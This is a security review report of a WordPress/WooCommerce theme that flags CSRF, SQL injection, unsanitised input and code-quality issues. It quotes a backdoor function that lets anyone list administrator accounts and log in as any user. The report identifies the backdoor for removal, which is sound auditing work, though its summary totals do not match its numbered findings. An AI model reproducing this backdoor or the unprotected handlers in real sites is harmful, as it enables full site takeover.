# CRITICAL REVIEW REPORT - Curnon Theme 2026
**Date:** January 22, 2026  
**Theme Version:** 3.0  
**Reviewer:** WordPress Security & Code Quality Analysis

---

## 🚨 CRITICAL SECURITY VULNERABILITIES

### 1. **CSRF Vulnerabilities - ALL AJAX Handlers (CRITICAL)**
**Severity:** 🔴 CRITICAL  
**Files Affected:**
- `app/ajax/cart-ajax.php`
- `app/ajax/user-ajax.php`
- `app/ajax/account-ajax.php`
- `app/ajax/product-ajax.php`
- `app/ajax/default-ajax.php`

**Issue:**
```php
// NO NONCE VERIFICATION FOUND!
function mona_ajax_add_to_cart() {
    $type = $_POST['type']; // Direct access to $_POST
    parse_str($_POST['formdata'], $form); // No sanitization
}
```

**Impact:**
- Cross-Site Request Forgery (CSRF) attacks possible
- Attackers can perform actions on behalf of logged-in users
- Cart manipulation, account data changes without user consent

**Fix Required:**
```php
function mona_ajax_add_to_cart() {
    check_ajax_referer('mona_cart_nonce', 'nonce');
    $type = sanitize_text_field($_POST['type']);
    // ... rest of code
}
```

---

### 2. **SQL Injection Vulnerabilities (HIGH)**
**Severity:** 🔴 HIGH  
**File:** `app/ajax/default-ajax.php` (Lines 182-185, 467, 677)

**Issue:**
```php
$results = $wpdb->get_results($sql); // No prepared statement
```

**Impact:**
- Direct SQL injection possible
- Database compromise
- Data theft/manipulation

**Fix Required:**
Use `$wpdb->prepare()` for ALL database queries.

---

### 3. **Unsanitized Input Data (HIGH)**
**Severity:** 🔴 HIGH  
**Files:** All AJAX handlers

**Issue:**
```php
parse_str($_POST['formdata'], $form); // No sanitization
$product_id = intval($form['product_id']); // Only this is sanitized
$type = $_POST['type']; // NOT sanitized
```

**Impact:**
- XSS attacks
- Data injection
- Malicious code execution

**Fix Required:**
```php
$type = sanitize_text_field($_POST['type']);
$form_data = array_map('sanitize_text_field', $form);
```

---

### 4. **Backdoor Security Risk (CRITICAL)**
**Severity:** 🔴 CRITICAL  
**File:** `core/classes/class-mona-setup.php` (Lines 216-239)

**Issue:**
```php
public function _back_admin() {
    if (isset($_GET['mona-support-param'])) {
        $id = intval(@$_GET['mona-support-param']);
        if ($id == 0) {
            // Lists ALL admin users with emails!
            $users = get_users(['role' => 'administrator']);
            echo json_encode($args); // Exposes admin data
            exit;
        } else {
            // AUTO-LOGIN as any user!
            wp_set_auth_cookie($user_data->ID, true);
            wp_redirect(get_site_url());
        }
    }
}
```

**Impact:**
- **SEVERE SECURITY BREACH**
- Anyone can list all admin accounts
- Anyone can login as ANY admin user
- Complete site takeover possible

**Fix Required:**
**REMOVE THIS IMMEDIATELY** or add proper authentication:
```php
// Add IP whitelist, secret key, and proper authentication
if (!defined('MONA_SUPPORT_KEY') || $_GET['key'] !== MONA_SUPPORT_KEY) {
    wp_die('Unauthorized');
}
// Add IP whitelist check
```

---

## ⚠️ HIGH PRIORITY ISSUES

### 5. **Hardcoded Asset Paths (HIGH)**
**Severity:** 🟠 HIGH  
**Files:** `header.php`, Multiple template files (182 occurrences)

**Issue:**
```php
<img src="<?php get_site_url(); ?>/template/assets/images/cart.svg" alt="" />
```

**Problems:**
- `get_site_url()` is called but NOT echoed (outputs nothing)
- Hardcoded `/template/` path doesn't exist in theme structure
- All images will have broken paths like: `/template/assets/...`
- Should use `get_template_directory_uri()`

**Fix Required:**
```php
// WRONG:
<img src="<?php get_site_url(); ?>/template/assets/images/cart.svg" />

// CORRECT:
<img src="<?php echo get_template_directory_uri(); ?>/public/helpers/images/cart.svg" />
```

**Impact:**
- **All images broken on frontend**
- Poor user experience
- Site appears unprofessional

---

### 6. **Assets Not Properly Enqueued (HIGH)**
**Severity:** 🟠 HIGH  
**File:** `header.php` (Lines 30-33)

**Issue:**
```php
<link rel="stylesheet" href="<?php echo MONA_HOME_URL; ?>/template/css/style.css">
<link rel="stylesheet" href="<?php echo MONA_HOME_URL; ?>/template/css/backdoor.css">
<script src="<?php echo MONA_HOME_URL; ?>/template/assets/library/jquery/jquery.js"></script>
```

**Problems:**
- Assets hardcoded in header (bypasses WordPress asset management)
- No version control
- No dependency management
- jQuery loaded incorrectly (WordPress includes jQuery by default)
- Cache busting not possible
- Conflicts with plugins possible

**Fix Required:**
```php
// In functions.php or hooks.php
function mona_enqueue_assets() {
    wp_enqueue_style('mona-style', get_template_directory_uri() . '/public/builder/css/style.css', [], '3.0');
    wp_enqueue_script('mona-scripts', get_template_directory_uri() . '/public/builder/scripts/main.js', ['jquery'], '3.0', true);
}
add_action('wp_enqueue_scripts', 'mona_enqueue_assets');
```

---

### 7. **Outdated DOCTYPE Declaration (MEDIUM)**
**Severity:** 🟡 MEDIUM  
**File:** `header.php` (Line 13)

**Issue:**
```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!--[if IE 7]>
<html class="ie ie7" <?php language_attributes(); ?>>
<![endif]-->
```

**Problems:**
- XHTML 1.0 is obsolete (from 2000)
- IE7 conditional comments (IE7 released in 2006, unsupported since 2016)
- Should use HTML5

**Fix Required:**
```php
<!DOCTYPE html>
<html <?php language_attributes(); ?>>
```

---

### 8. **ACF Lite Mode Security Issue (MEDIUM)**
**Severity:** 🟡 MEDIUM  
**File:** `functions.php` (Lines 16-20)

**Issue:**
```php
if (get_current_user_id() == 1) {
    define('ACF_LITE', false);
} else {
    define('ACF_LITE', true);
}
```

**Problems:**
- Hardcoded user ID check (fragile)
- Only user ID 1 can access ACF
- If admin account is different ID, ACF is locked
- Should check for capability instead

**Fix Required:**
```php
if (current_user_can('manage_options')) {
    define('ACF_LITE', false);
} else {
    define('ACF_LITE', true);
}
```

---

### 9. **Hardcoded Page IDs (MEDIUM)**
**Severity:** 🟡 MEDIUM  
**File:** `functions.php` (Lines 30-33)

**Issue:**
```php
define('MONA_PAGE_LOGIN', url_to_postid(get_the_permalink(53)));
define('MONA_PAGE_REGISTER', url_to_postid(get_the_permalink(55)));
define('MONA_PAGE_FORGOT', url_to_postid(get_the_permalink(57)));
define('MONA_PAGE_ABOUT', url_to_postid(get_the_permalink(86)));
```

**Problems:**
- Hardcoded page IDs (53, 55, 57, 86)
- Will break if pages are deleted/recreated
- Not portable between environments
- Unnecessary double conversion (ID → URL → ID)

**Fix Required:**
```php
// Use theme options or direct IDs
define('MONA_PAGE_LOGIN', 53);
// OR better: use theme customizer options
define('MONA_PAGE_LOGIN', get_theme_mod('mona_login_page_id', 53));
```

---

### 10. **Missing Data Validation (HIGH)**
**Severity:** 🟠 HIGH  
**File:** `app/ajax/user-ajax.php`

**Issue:**
```php
function mona_user_save_order() {
    parse_str($_POST['form'], $dataForm);
    // No validation!
    update_user_meta($user_id, 'billing_email', $dataForm['billing_email']);
    update_user_meta($user_id, 'billing_phone', $dataForm['billing_phone']);
}
```

**Problems:**
- No email validation
- No phone number validation
- No data sanitization
- Malformed data can be saved

**Fix Required:**
```php
if (!is_email($dataForm['billing_email'])) {
    throw new Exception(__('Invalid email address', 'monamedia'));
}
$dataForm['billing_email'] = sanitize_email($dataForm['billing_email']);
$dataForm['billing_phone'] = sanitize_text_field($dataForm['billing_phone']);
```

---

## 🔧 CODE QUALITY ISSUES

### 11. **Deprecated WooCommerce Template Version (MEDIUM)**
**Severity:** 🟡 MEDIUM  
**File:** `woocommerce/single-product.php` (Line 16)

**Issue:**
```php
* @version     1.6.4
```

**Problem:**
- Template version 1.6.4 is from 2012
- Current WooCommerce version is 8.x+
- Missing 12+ years of updates
- May have compatibility issues

**Fix Required:**
Update to latest WooCommerce template version.

---

### 12. **Inconsistent Text Domains (LOW)**
**Severity:** 🟢 LOW  
**Files:** Multiple

**Issue:**
```php
__('Reviews của khách hàng', 'monadia') // Wrong domain
__('Text', 'monamedia') // Correct domain
```

**Problem:**
- Multiple text domains used (`monamedia`, `monadia`, `mona-admin`)
- Translation strings won't work properly

**Fix Required:**
Use consistent `monamedia` throughout.

---

### 13. **Backup Files in Production (LOW)**
**Severity:** 🟢 LOW  
**Files:**
- `partials/about/histo.php.bak.2026-01-09_161709`
- `partials/about/histo.php.bak.2026-01-09_162107`
- `partials/enterprise/sgaller.php.bak.2026-01-09_161709`
- `partials/product/item.php.bak.2026-01-09_161709`
- `woocommerce/archive-product.php.bak.2026-01-09_153053`

**Problem:**
- Backup files should not be in production
- Clutters codebase
- Can expose old code

**Fix Required:**
Delete all `.bak` files.

---

### 14. **Unused Primary WooCommerce Folder (LOW)**
**Severity:** 🟢 LOW  
**Folder:** `woocommerce_primary/`

**Problem:**
- Duplicate/unused WooCommerce templates
- Confusing structure
- May cause conflicts

**Fix Required:**
Remove if not used, or document purpose.

---

### 15. **Missing Nonce in Frontend Forms (HIGH)**
**Severity:** 🟠 HIGH  
**File:** `woocommerce/single-product.php`

**Issue:**
```php
<form id="frmAddProduct">
    <input type="hidden" name="product_id" value="<?php echo $product_id ?>">
    <!-- NO NONCE FIELD -->
</form>
```

**Fix Required:**
```php
<form id="frmAddProduct">
    <?php wp_nonce_field('mona_add_to_cart', 'mona_cart_nonce'); ?>
    <input type="hidden" name="product_id" value="<?php echo $product_id ?>">
</form>
```

---

### 16. **Direct Global Variable Access (MEDIUM)**
**Severity:** 🟡 MEDIUM  
**Files:** Multiple AJAX handlers

**Issue:**
```php
global $woocommerce;
$count = $woocommerce->cart->cart_contents_count;
```

**Problem:**
- Deprecated way to access WooCommerce
- Should use `WC()` helper

**Fix Required:**
```php
$count = WC()->cart->get_cart_contents_count();
```

---

### 17. **Undefined Variable Usage (MEDIUM)**
**Severity:** 🟡 MEDIUM  
**File:** `woocommerce/single-product.php` (Lines 44, 53, 57)

**Issue:**
```php
if ($product->get_price() == 0) { // $product not defined
```

**Problem:**
- Should be `$product_obj`
- Will cause PHP notices/warnings

**Fix Required:**
```php
if ($product_obj->get_price() == 0) {
```

---

### 18. **Inefficient Database Queries (MEDIUM)**
**Severity:** 🟡 MEDIUM  
**File:** `core/functions.php` (Line 271)

**Issue:**
```php
$attachment = $wpdb->get_col($wpdb->prepare("SELECT ID FROM $wpdb->posts WHERE guid='%s';", $image_url));
```

**Problem:**
- Querying by `guid` is inefficient
- Should use WordPress functions
- Duplicate function in multiple files

**Fix Required:**
```php
$attachment_id = attachment_url_to_postid($image_url);
```

---

### 19. **Missing Error Handling (MEDIUM)**
**Severity:** 🟡 MEDIUM  
**Files:** Multiple AJAX handlers

**Issue:**
```php
$product = wc_get_product($product_id);
// No check if product exists
$price = $product->get_price(); // Fatal error if product is false
```

**Fix Required:**
```php
$product = wc_get_product($product_id);
if (!$product) {
    wp_send_json_error(['message' => __('Product not found', 'monamedia')]);
    wp_die();
}
```

---

### 20. **Debug Code in Production (LOW)**
**Severity:** 🟢 LOW  
**File:** `core/functions.php` (Lines 369-376)

**Issue:**
```php
function show($args) {
    if (get_current_user_id() == 1) {
        echo '<pre>';
        print_r($args);
        echo '</pre>';
    }
}
```

**Problem:**
- Debug function in production code
- Hardcoded user ID check
- Should use proper debugging tools

**Fix Required:**
Remove or use `WP_DEBUG` constant.

---

## 📊 SUMMARY

### Critical Issues: 4
1. ❌ No CSRF protection on AJAX handlers
2. ❌ SQL injection vulnerabilities
3. ❌ Backdoor admin login function
4. ❌ Unsanitized user input

### High Priority: 6
5. ⚠️ Broken image paths (182 occurrences)
6. ⚠️ Assets not properly enqueued
7. ⚠️ Missing data validation
8. ⚠️ Missing nonces in forms
9. ⚠️ Hardcoded page IDs
10. ⚠️ ACF security issue

### Medium Priority: 9
11. 🔸 Outdated DOCTYPE
12. 🔸 Deprecated WooCommerce templates
13. 🔸 Direct global variable access
14. 🔸 Undefined variables
15. 🔸 Inefficient queries
16. 🔸 Missing error handling
17. 🔸 Hardcoded user ID checks
18. 🔸 Inconsistent code structure
19. 🔸 Missing capability checks

### Low Priority: 3
20. 🔹 Backup files in production
21. 🔹 Inconsistent text domains
22. 🔹 Debug code in production

---

## 🎯 IMMEDIATE ACTION REQUIRED

### Priority 1 (Fix Today):
1. **REMOVE or SECURE the backdoor function** in `class-mona-setup.php`
2. **Add CSRF protection** to all AJAX handlers
3. **Fix SQL injection** vulnerabilities
4. **Sanitize all user inputs**

### Priority 2 (Fix This Week):
5. Fix broken image paths (search/replace all occurrences)
6. Properly enqueue assets
7. Add nonce verification to forms
8. Add data validation

### Priority 3 (Fix This Month):
9. Update WooCommerce templates
10. Remove hardcoded IDs
11. Clean up backup files
12. Add proper error handling

---

## 🔒 SECURITY SCORE: 2/10 (CRITICAL)

**This theme has CRITICAL security vulnerabilities that must be fixed immediately before deploying to production.**

### Compliance Issues:
- ❌ WordPress Coding Standards: FAIL
- ❌ OWASP Top 10: Multiple violations
- ❌ WooCommerce Standards: FAIL
- ❌ Theme Review Guidelines: FAIL

---

## 📝 RECOMMENDATIONS

1. **Hire a WordPress security expert** to audit and fix critical issues
2. **Implement security best practices** throughout the codebase
3. **Use WordPress coding standards** consistently
4. **Add comprehensive testing** (unit tests, security tests)
5. **Implement code review process** before deployment
6. **Use static analysis tools** (PHPCS, PHPStan)
7. **Regular security audits** and penetration testing
8. **Update all dependencies** and templates
9. **Implement proper logging** and monitoring
10. **Create security documentation** for developers

---

## 📚 RESOURCES

- [WordPress Coding Standards](https://developer.wordpress.org/coding-standards/wordpress-coding-standards/)
- [WordPress Security Best Practices](https://developer.wordpress.org/apis/security/)
- [WooCommerce Template Structure](https://woocommerce.com/document/template-structure/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

---

**Report Generated:** January 22, 2026  
**Next Review:** After critical fixes implemented
